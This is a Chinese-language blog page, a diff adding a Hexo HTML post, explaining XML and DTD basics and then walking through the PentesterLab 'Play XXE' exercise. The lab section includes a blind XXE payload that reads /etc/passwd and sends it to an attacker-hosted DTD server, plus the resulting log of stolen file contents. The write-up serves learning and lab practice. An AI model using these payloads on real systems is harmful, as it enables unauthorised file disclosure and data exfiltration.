@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Shinpachi8" />
+
+
+
+<meta name="description" content="如果有问题请您指正。
+XML基础
+xml 是 可扩展标记语言(EXtensible Markup Language)的缩写。它与HTML类似同为w3c推荐标准，但是比HTML要严谨。因为它所有的标签一定要闭合。 同时它也可以用自己定义的标签，但是XML是不作为的标记语言，不像HTML，XML只是将数据结构化存储与传输。 w3cschool－xml的教程
+
+
+XML有关的几点：
+
+所有XML都必须要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Xxe漏洞及xxe练习">
+<meta property="og:url" content="http://yoursite.com/2017/01/18/xxe漏洞及xxe练习/index.html">
+<meta property="og:site_name" content="shin's blog">
+<meta property="og:description" content="如果有问题请您指正。
+XML基础
+xml 是 可扩展标记语言(EXtensible Markup Language)的缩写。它与HTML类似同为w3c推荐标准，但是比HTML要严谨。因为它所有的标签一定要闭合。 同时它也可以用自己定义的标签，但是XML是不作为的标记语言，不像HTML，XML只是将数据结构化存储与传输。 w3cschool－xml的教程
+
+
+XML有关的几点：
+
+所有XML都必须要">
+<meta property="og:image" content="http://img.blog.csdn.net/20161204205517599">
+<meta property="og:image" content="http://img.blog.csdn.net/20161204205634398">
+<meta property="og:updated_time" content="2017-01-19T03:10:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Xxe漏洞及xxe练习">
+<meta name="twitter:description" content="如果有问题请您指正。
+XML基础
+xml 是 可扩展标记语言(EXtensible Markup Language)的缩写。它与HTML类似同为w3c推荐标准，但是比HTML要严谨。因为它所有的标签一定要闭合。 同时它也可以用自己定义的标签，但是XML是不作为的标记语言，不像HTML，XML只是将数据结构化存储与传输。 w3cschool－xml的教程
+
+
+XML有关的几点：
+
+所有XML都必须要">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20161204205517599">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="shin&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Xxe漏洞及xxe练习 | shin&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/assets/img/shinpachi.JPG" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Shinpachi8</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">远看泰山黑乎乎</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                            <li><a href="/friendlink/">友链</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Shinpachi8</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/assets/img/shinpachi.JPG" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Shinpachi8</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">远看泰山黑乎乎</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                    <li><a href="/friendlink/">友链</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-xxe漏洞及xxe练习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/01/18/xxe漏洞及xxe练习/" class="article-date">
+      <time datetime="2017-01-18T12:42:51.000Z" itemprop="datePublished">2017-01-18</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Xxe漏洞及xxe练习
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/learn/">learn</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>如果有问题请您指正。</p>
+<h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><blockquote>
+<p>xml 是 可扩展标记语言(EXtensible Markup Language)的缩写。它与HTML类似同为w3c推荐标准，但是比HTML要严谨。因为它所有的标签一定要闭合。 同时它也可以用自己定义的标签，但是XML是不作为的标记语言，不像HTML，XML只是将数据结构化存储与传输。 <a href="http://www.w3school.com.cn/xml/index.asp" target="_blank" rel="external">w3cschool－xml的教程</a></p>
+</blockquote>
+<ol>
+<li><p>XML有关的几点：</p>
+<ul>
+<li><p>所有XML都必须要有关闭标签。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> this's note example <span class="tag">&lt;<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>所有XML的标签对大小写敏感</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">Message</span>&gt;</span> i've something to tell u <span class="tag">&lt;/<span class="name">Message</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span> the '<span class="tag">&lt;<span class="name">Message</span>&gt;</span>' is different with '<span class="tag">&lt;<span class="name">message</span>&gt;</span>' <span class="tag">&lt;/<span class="name">message</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 在XML里不允许出现 &lt;|&gt;|'|"|&amp; 五个符号，上边出现是为了演示方便。 --&gt;</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>XML的属性值必须加引号</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">&lt;!-- wrong example --&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">data</span>=<span class="string">8/2/16/</span>&gt;</span> <span class="tag">&lt;/<span class="name">note</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- right example --&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">data</span>=<span class="string">"08/02/16"</span>&gt;</span> <span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>在XML中有五个符号需要实体引用</p>
+</li>
+</ul>
+</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">实体引用</th>
+<th style="text-align:center">符号</th>
+<th style="text-align:center">中文解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>&amp;lt;</code></td>
+<td style="text-align:center"><code>&lt;</code></td>
+<td style="text-align:center">小于号</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>&amp;gt;</code></td>
+<td style="text-align:center"><code>&gt;</code></td>
+<td style="text-align:center">大于号</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>&amp;amp;</code></td>
+<td style="text-align:center"><code>&amp;</code></td>
+<td style="text-align:center">和号</td>
+<td>c</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>&amp;apos;</code></td>
+<td style="text-align:center"><code>&#39;</code></td>
+<td style="text-align:center">单引号</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>&amp;quot;</code></td>
+<td style="text-align:center"><code>&quot;</code></td>
+<td style="text-align:center">双引号</td>
+</tr>
+</tbody>
+</table>
+<a id="more"></a>
+<h1 id="DTD验证"><a href="#DTD验证" class="headerlink" title="DTD验证"></a>DTD验证</h1><blockquote>
+<p>DTD是文档类型定义(Document Type Define)的缩写，其作用是定义XML文档的合法构建模块。 <a href="http://www.w3school.com.cn/dtd/index.asp" target="_blank" rel="external">W3C School DTD 教程</a>. DTD实体变量在使用是以<code>&amp;</code>开头，以<code>;</code>结束</p>
+</blockquote>
+<ol>
+<li><p>DTD 举例说明</p>
+<ul>
+<li><p>在内部</p>
+<blockquote>
+<p>语法如下: &lt;!DOCTYPE 根元素 [元素声明]&gt;</p>
+</blockquote>
+  <figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- This's a DTD example in XML file --&gt;</span></div><div class="line">&lt;?xml version="1.0"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE note [</span></div><div class="line">    &lt;!ELEMENT note (to, from, heading, body)&gt;</div><div class="line">    &lt;!ELEMENT to (#PCDATA)&gt;</div><div class="line">    &lt;!ELEMENT from (#PCDATA)&gt;</div><div class="line">    &lt;!ELEMENT heading (#PCDATA)&gt;</div><div class="line">    &lt;!ELEMEhhNT body (#PCDATA)&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span> jxy <span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span> jxy <span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span> Remider <span class="tag">&lt;/<span class="name">heading</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span> Don't forgot working hard <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure>
+<ul>
+<li><code>!DOCTYPE note</code> 定义此文档是note类型的文档</li>
+<li><code>!ELEMENT note</code> 定义note元素有四个元素 : to,from,heading, body</li>
+<li><code>!ELEMENT to|from|heading|body</code> 定义to|from|heading|body元素为<code>#PCDATA</code> 类型</li>
+</ul>
+</li>
+<li><p>外部文档声明</p>
+<blockquote>
+<p>语法如下: &lt;!DOCTYPE 根元素 SYSTEM|PUBLIC “文件名”&gt;</p>
+</blockquote>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</div><div class="line">&lt;note&gt;</div><div class="line">    &lt;to&gt; jxy &lt;/to&gt;</div><div class="line">    &lt;from&gt;  jxy &lt;/from&gt;</div><div class="line">    &lt;heading&gt; Remeber &lt;/heading&gt;</div><div class="line">    &lt;body&gt; Don&apos;t forgot work hard &lt;/body&gt;</div><div class="line">&lt;/note&gt;</div><div class="line"></div><div class="line">&lt;!-- note.dtd</div><div class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</div><div class="line">&lt;!ELEMENT to (#PCDATA)&gt;</div><div class="line">&lt;!ELEMENT from (#PCDATA)&gt;</div><div class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</div><div class="line">&lt;!ELEMENT body (#PCDATA)&gt;</div><div class="line">--&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>DTD 解释<br> 所有的XML以为HTML文档均为以下简单的构建模块构成.<br> | 元素 | 属性 | 实体 | PCDATA | CDATA |<br> |——|——|——|——-|——–|<br> | 同上 | 同上 | 同上 | PCDATA是会被解析器解析的文本，这些文本将会被解析器检查实体与标记。| CDATA是不会被解析器解析的文件。|</p>
+<p> 重点在于 DTD中的实体声明。这是XXE洞的基础。其中SYSTEM|PUBLIC是两种状态，一是私有的，另外一个是公有的。可参考 <a href="http://xmlwriter.net/xml_guide/entity_declaration.shtml" target="_blank" rel="external">这篇文章</a></p>
+<ul>
+<li><p>一个内部实体的声明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名 &quot;实体的值&quot; &gt;</div><div class="line">&lt;!-- Examples --&gt;</div><div class="line">&lt;!ENTITY write &quot;Shinpachi8&quot; &gt;</div><div class="line">&lt;!ENTITY copyright &apos;@Shinpachi8&apos;&gt;</div><div class="line"></div><div class="line">&lt;!-- 参数变量声明 --&gt;</div><div class="line">&lt;!ENTITY %foo1 SYSTEM &quot;foo1&quot;&gt;</div><div class="line">&lt;!-- 在使用时，用%来使用. --&gt;</div><div class="line">%foo1;</div></pre></td></tr></table></figure>
+</li>
+<li><p>一个外部实体的声明。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名 SYSTEM|PUBLIC &quot;url/uri&quot;&gt;</div><div class="line">&lt;!-- Example --&gt;</div><div class="line">&lt;!ENTITY writer SYSTEM &quot;http://xxx.com&quot;&gt;</div><div class="line">&lt;!ENTITY copyrite PUBLIC &apos;../xx.dtd&apos;&gt;</div><div class="line"></div><div class="line">&lt;!-- 参数变量声明 --&gt;</div><div class="line">&lt;!ENTITY %foo1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY %foo2 SYSTEM &quot;http://127.0.0.1/id=%foo1;&quot;&gt;</div></pre></td></tr></table></figure>
+</li>
+<li><p>CDATA 解释<br>这里稍微解释一下CDATA的内容。如上所说CDATA是不应由XML解析器进行解析的文本数据 (Unparsed Character Data)。在CDATA中，即使’&lt;&gt;&amp;’符号也不会产生错误。CDATA部分由<code>&lt;![CDATA[</code>开始，由<code>]]&gt;</code>结束。但是CDATA部分不能包含字符串<code>]]&gt;</code>。如下.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">&lt;![CDATA[</div><div class="line">function matchwo(a, b)&#123;</div><div class="line">    if (a &lt; b &amp;&amp; a &lt; 0) then</div><div class="line">    &#123;</div><div class="line">        return 1;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">]]&gt;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="XXE-漏洞"><a href="#XXE-漏洞" class="headerlink" title="XXE 漏洞"></a>XXE 漏洞</h1><p>OWASP关于XXE的一些文档:</p>
+<ol>
+<li><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008" target="_blank" rel="external">Testing for XML Injection</a>)</li>
+<li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="external">XML External Entity (XXE) Prevention Cheat Sheet</a>_Prevention_Cheat_Sheet)</li>
+</ol>
+<p>另外还有一些关于XXE的CTF：<br>1.<a href="https://gist.github.com/h3xstream/3d51b99f651548f7fa2b" target="_blank" rel="external">GoSecure CTF</a><br>2.<a href="http://www.pwntester.com/tag/xxe/" target="_blank" rel="external">HACK YOU 2014</a></p>
+<p>现在这一部分是由PENTEST LAB的XXE练习来总结的。也参考了以上的内容。</p>
+<ol>
+<li>在<a href="https://pentesterlab.com/exercises/play_xxe" target="_blank" rel="external">pentest lab</a> 上下载iso镜象并安装至VIRTUAL BOX上。打开网页是一个登录界面。</li>
+<li>用BURPSUITE做代理得如下。<br> <img src="http://img.blog.csdn.net/20161204205517599" alt="play xxe login"></li>
+<li><p>用xml的实体来试。<br> 输入为：</p>
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /login HTTP/1.1</div><div class="line">Host: 10.108.40.26</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://10.108.40.26/login</div><div class="line">Connection: keep-alive</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Length: 37</div><div class="line"></div><div class="line">&lt;?xml version="1.0"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>xxe</div></pre></td></tr></table></figure>
+<p> 虽然 请求内容为非正常的XML, 但是回复与上图相同。 原因在于<code>Content-Type</code>请求头未设置。即如果请求为：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /login HTTP/1.1</div><div class="line">Host: 10.108.40.26</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://10.108.40.26/login</div><div class="line">Connection: keep-alive</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: text/xml</div><div class="line">Content-Length: 31</div><div class="line"></div><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;foo&gt;xxe</div></pre></td></tr></table></figure>
+<p> 那么响应为：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;p id=&quot;detail&quot;&gt;</div><div class="line">    For request &apos;POST /login&apos; [Invalid XML]</div><div class="line">&lt;/p&gt;</div></pre></td></tr></table></figure>
+<p> 可以看出是有XML问题的。 但是如果请求一个正常的XML格式，返回的内容与图一致。即这是一个Blind XML. 需要一个带外数据通道来显未数据。</p>
+</li>
+<li><p>Blind XXE</p>
+<ul>
+<li><p>首先在攻击者的服务器建一个DTD的数据格式文件。其内容为：</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY %file SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY %request &quot;&lt;!ENTITY foo SYSTEM &apos;http://your.IP/id=%file;&apos;&gt;&quot;&gt;</div><div class="line">%request;</div></pre></td></tr></table></figure>
+</li>
+<li><p>在LOGIIN时POST数据更改为:</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">POST /login HTTP/1.1</div><div class="line">Host: 10.108.40.26</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://10.108.40.26/login</div><div class="line">Connection: keep-alive</div><div class="line">Content-Type: text/xml</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Length: 98</div><div class="line"></div><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;!DOCTYPE xxe SYSTEM &quot;http://10.108.41.62:8000/evil.dtd&quot;&gt;</div><div class="line">&lt;xxe&gt;foo&lt;/xxe&gt;</div></pre></td></tr></table></figure>
+<p>  此时会在攻击的本地生成一条请求记录如下：</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">10.108.40.26 - - [04/Dec/2016 20:13:47] &quot;GET /evil.dtd HTTP/1.1&quot; 200 -</div></pre></td></tr></table></figure>
+<p>  即这时我们已经成功的进行了请求。 如果 把请求内容改成。这里<code>&amp;</code>符号后边的foo，对应的是自己写的DTD文件中的foo</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot;&gt;</div><div class="line">&lt;!DOCTYPE xxe SYSTEM &quot;http://10.108.41.62:8000/evil.dtd&quot;&gt;</div><div class="line">&lt;xxe&gt;&amp;foo;&lt;/xxe&gt;</div></pre></td></tr></table></figure>
+<p>  刚在攻击者日志会显示 ：</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">10.108.40.26 - - [04/Dec/2016 20:19:40] &quot;GET /evil.dtd HTTP/1.1&quot; 200 -</div><div class="line">10.108.40.26 - - [04/Dec/2016 20:19:40] &quot;GET /?id=root:x:0:0:root:/root:/bin/sh%0Alp:x:7:7:lp:/var/spool/lpd:/bin/sh%0Anobody:x:65534:65534:nobody:/nonexistent:/bin/false%0Atc:x:1001:50:Linux%20User,,,:/home/tc:/bin/sh%0Apentesterlab:x:1000:50:Linux%20User,,,:/home/pentesterlab:/bin/sh%0Aplay:x:100:65534:Linux%20User,,,:/opt/play-2.1.3/xxe/:/bin/false%0Amysql:x:101:65534:Linux%20User,,,:/home/mysql:/bin/false%0A HTTP/1.1&quot; 200 -</div></pre></td></tr></table></figure>
+<p>  在BURPSUITE里 DECODE一下即为：<br>  <img src="http://img.blog.csdn.net/20161204205634398" alt="play xxe file read"><br>  可以看出来。已经成功的读取到了<code>/etc/passwd</code>的文件内容。这个ISO练习还有一部分，但是不是涉及XXE的问题，所以有兴趣的可以自己尝试一下。</p>
+</li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/01/18/xxe漏洞及xxe练习/">Xxe漏洞及xxe练习</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Shinpachi8</a></p>
+        <p><span>发布时间:</span>2017-01-18, 20:42:51</p>
+        <p><span>最后更新:</span>2017-01-19, 11:10:44</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/01/18/xxe漏洞及xxe练习/" title="Xxe漏洞及xxe练习">http://yoursite.com/2017/01/18/xxe漏洞及xxe练习/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/01/18/xxe漏洞及xxe练习/　　作者: Shinpachi8" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
